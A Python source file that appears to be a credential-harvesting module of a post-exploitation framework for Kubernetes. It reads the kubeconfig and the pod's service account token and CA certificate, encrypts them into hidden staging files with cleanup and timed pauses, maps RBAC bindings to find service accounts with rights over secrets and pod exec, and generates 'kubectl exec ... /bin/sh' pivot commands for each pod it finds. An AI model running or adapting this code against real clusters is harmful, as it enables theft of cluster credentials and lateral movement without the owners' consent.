from __future__ import annotations

import json
import logging
import os
from pathlib import Path
from typing import Generator, Optional

from forge.utils.post.collectors.filesystem import ArtifactMetadata, BaseCollector, CollectedFile

try:
    from kubernetes import client as kubernetes_client
    from kubernetes import config as kubernetes_config
except ImportError:  # pragma: no cover
    kubernetes_client = None
    kubernetes_config = None

_LOG = logging.getLogger(__name__)

_RISKY_PERMISSIONS = {
    "pods/create",
    "pods/exec",
    "secrets/get",
    "secrets/list",
    "secrets/create",
    "deployments/create",
    "daemonsets/create",
    "statefulsets/create",
    "cronjobs/create",
    "jobs/create",
    "roles/create",
    "clusterroles/create",
    "rolebindings/create",
    "clusterrolebindings/create",
}

_SERVICE_ACCOUNT_DIR = Path("/var/run/secrets/kubernetes.io/serviceaccount")


class KubernetesCollector(BaseCollector):
    def discover(self) -> Generator[ArtifactMetadata, None, None]:
        kubeconfig = Path.home() / ".kube" / "config"
        if kubeconfig.exists():
            yield ArtifactMetadata(
                artifact_family="kubernetes_config",
                artifact_subtype="kubeconfig",
                source_path=str(kubeconfig),
                source_platform=os.name,
                collection_method="file_read",
            )

        sa_dir = _SERVICE_ACCOUNT_DIR
        if sa_dir.exists():
            for item in ("token", "namespace", "ca.crt"):
                source = sa_dir / item
                if source.exists():
                    yield ArtifactMetadata(
                        artifact_family="kubernetes_credentials",
                        artifact_subtype=f"service_account_{item}",
                        source_path=str(source),
                        source_platform=os.name,
                        collection_method="file_read",
                    )

        if "KUBERNETES_SERVICE_HOST" in os.environ:
            yield ArtifactMetadata(
                artifact_family="kubernetes_context",
                artifact_subtype="env_vars",
                source_path="os.environ",
                source_platform=os.name,
                collection_method="api_call",
                report_safe_summary_fields={
                    "host": os.environ.get("KUBERNETES_SERVICE_HOST"),
                    "port": os.environ.get("KUBERNETES_SERVICE_PORT"),
                },
            )

        yield from self._discover_inventory()
        yield from self.map_rbac_and_secrets()

    def collect(self, artifact: ArtifactMetadata) -> Optional[CollectedFile]:
        if artifact.collection_method == "api_call":
            return self._collect_api_snapshot(artifact)

        try:
            path = Path(artifact.source_path)
            if not path.exists():
                return None

            data = path.read_bytes()
            sha256 = self._sha256(data)
            payload = self._compress_and_encrypt(data)
            ext = artifact.artifact_subtype or "k8s"
            stage_path = self._staging_dir / f".{sha256[:16]}.{ext}.tmp"
            stage_path.write_bytes(payload)
            self._register_cleanup(stage_path)

            record = CollectedFile(
                path=str(path),
                sha256=sha256,
                size_bytes=len(payload),
                metadata=artifact,
            )
            self.persist_metadata(record)
            self._stagger_and_pause()
            return record
        except PermissionError:
            _LOG.debug("Permission denied: %s", artifact.source_path)
        except Exception as exc:
            _LOG.debug("Kubernetes collection error (%s): %s", artifact.source_path, exc)
        return None

    def validate(self, artifact: CollectedFile) -> bool:
        _LOG.debug("Kubernetes validation skipped (default).")
        artifact.metadata.validation_state = "skipped"
        return False

    def map_rbac_and_secrets(self) -> Generator[ArtifactMetadata, None, None]:
        clients = self._load_clients()
        if clients is None:
            return

        core_v1, rbac_v1 = clients
        try:
            roles = {
                (role.metadata.namespace, role.metadata.name): role
                for role in rbac_v1.list_role_for_all_namespaces().items
            }
            cluster_roles = {role.metadata.name: role for role in rbac_v1.list_cluster_role().items}
            service_account_permissions: dict[str, set[str]] = {}

            for binding in rbac_v1.list_role_binding_for_all_namespaces().items:
                for subject in binding.subjects or []:
                    if subject.kind != "ServiceAccount":
                        continue
                    service_account_name = f"{binding.metadata.namespace}/{subject.name}"
                    permissions = service_account_permissions.setdefault(
                        service_account_name, set()
                    )
                    role = roles.get((binding.metadata.namespace, binding.role_ref.name))
                    if role is None:
                        continue
                    permissions.update(self._expand_rules(role.rules or []))

            for binding in rbac_v1.list_cluster_role_binding().items:
                for subject in binding.subjects or []:
                    if subject.kind != "ServiceAccount":
                        continue
                    service_account_name = f"{subject.namespace}/{subject.name}"
                    permissions = service_account_permissions.setdefault(
                        service_account_name, set()
                    )
                    role = cluster_roles.get(binding.role_ref.name)
                    if role is None:
                        continue
                    permissions.update(self._expand_rules(role.rules or []))

            pods = core_v1.list_pod_for_all_namespaces().items
            pod_targets_by_service_account: dict[str, list[str]] = {}
            for pod in pods:
                namespace = pod.metadata.namespace or "default"
                service_account = getattr(pod.spec, "service_account_name", None) or "default"
                pod_targets_by_service_account.setdefault(
                    f"{namespace}/{service_account}",
                    [],
                ).append(f"{namespace}/{pod.metadata.name}")

            secret_count_by_namespace: dict[str, int] = {}
            for secret in core_v1.list_secret_for_all_namespaces().items:
                namespace = secret.metadata.namespace or "default"
                secret_count_by_namespace[namespace] = (
                    secret_count_by_namespace.get(namespace, 0) + 1
                )

            for service_account_name, permissions in sorted(service_account_permissions.items()):
                risky_permissions = sorted(_RISKY_PERMISSIONS.intersection(permissions))
                if not risky_permissions:
                    continue
                namespace, _, _ = service_account_name.partition("/")
                pod_targets = pod_targets_by_service_account.get(service_account_name, [])
                yield ArtifactMetadata(
                    artifact_family="kubernetes_pivot_opportunity",
                    artifact_subtype="risky_service_account",
                    source_path=service_account_name,
                    source_platform="kubernetes",
                    collection_method="api_call",
                    report_safe_summary_fields={
                        "service_account": service_account_name,
                        "namespace": namespace,
                        "risky_permissions": risky_permissions,
                        "pod_targets": pod_targets,
                        "secret_count_in_namespace": secret_count_by_namespace.get(namespace, 0),
                        "workflow_preview": self.generate_pivot_workflows(
                            service_account_name,
                            pod_targets=pod_targets,
                        ),
                    },
                )
        except Exception as exc:
            _LOG.debug("Error during Kubernetes RBAC mapping: %s", exc)

    def generate_pivot_workflows(
        self,
        service_account_name: str,
        pod_targets: Optional[list[str]] = None,
    ) -> list[str]:
        targets = pod_targets
        if targets is None:
            targets = self._lookup_pod_targets(service_account_name)

        workflows: list[str] = []
        for target in targets:
            namespace, _, pod_name = target.partition("/")
            workflows.append(f"kubectl exec -n {namespace} {pod_name} -- /bin/sh")
        return workflows

    def _discover_inventory(self) -> Generator[ArtifactMetadata, None, None]:
        clients = self._load_clients()
        if clients is None:
            return

        core_v1, _ = clients
        try:
            namespaces = core_v1.list_namespace().items
            pods = core_v1.list_pod_for_all_namespaces().items
            service_accounts = core_v1.list_service_account_for_all_namespaces().items
            yield ArtifactMetadata(
                artifact_family="kubernetes_inventory",
                artifact_subtype="cluster_inventory",
                source_path="kubernetes_api",
                source_platform="kubernetes",
                collection_method="api_call",
                report_safe_summary_fields={
                    "namespace_count": len(namespaces),
                    "pod_count": len(pods),
                    "service_account_count": len(service_accounts),
                    "namespaces": sorted(
                        namespace.metadata.name
                        for namespace in namespaces
                        if namespace.metadata and namespace.metadata.name
                    )[:25],
                },
            )
        except Exception as exc:
            _LOG.debug("Error during Kubernetes inventory discovery: %s", exc)

    def _collect_api_snapshot(self, artifact: ArtifactMetadata) -> Optional[CollectedFile]:
        data = json.dumps(artifact.report_safe_summary_fields, sort_keys=True).encode()
        sha256 = self._sha256(data)
        payload = self._compress_and_encrypt(data)
        ext = artifact.artifact_subtype or "k8s_ctx"
        stage_path = self._staging_dir / f".{sha256[:16]}.{ext}.tmp"
        stage_path.write_bytes(payload)
        self._register_cleanup(stage_path)

        record = CollectedFile(
            path=artifact.source_path,
            sha256=sha256,
            size_bytes=len(payload),
            metadata=artifact,
        )
        self.persist_metadata(record)
        return record

    def _load_clients(self) -> Optional[tuple[object, object]]:
        if kubernetes_client is None or kubernetes_config is None:
            return None

        try:
            try:
                kubernetes_config.load_kube_config()
            except Exception:
                kubernetes_config.load_in_cluster_config()
            return kubernetes_client.CoreV1Api(), kubernetes_client.RbacAuthorizationV1Api()
        except Exception as exc:
            _LOG.debug("Kubernetes client unavailable: %s", exc)
            return None

    def _lookup_pod_targets(self, service_account_name: str) -> list[str]:
        clients = self._load_clients()
        if clients is None:
            return []

        core_v1, _ = clients
        namespace, _, account_name = service_account_name.partition("/")
        try:
            pods = core_v1.list_namespaced_pod(namespace).items
        except Exception as exc:
            _LOG.debug("Error looking up Kubernetes pod targets: %s", exc)
            return []

        return [
            f"{namespace}/{pod.metadata.name}"
            for pod in pods
            if getattr(pod.spec, "service_account_name", None) == account_name
        ]

    @staticmethod
    def _expand_rules(rules: list[object]) -> set[str]:
        expanded: set[str] = set()
        for rule in rules:
            for resource in getattr(rule, "resources", []) or []:
                for verb in getattr(rule, "verbs", []) or []:
                    expanded.add(f"{resource}/{verb}")
        return expanded
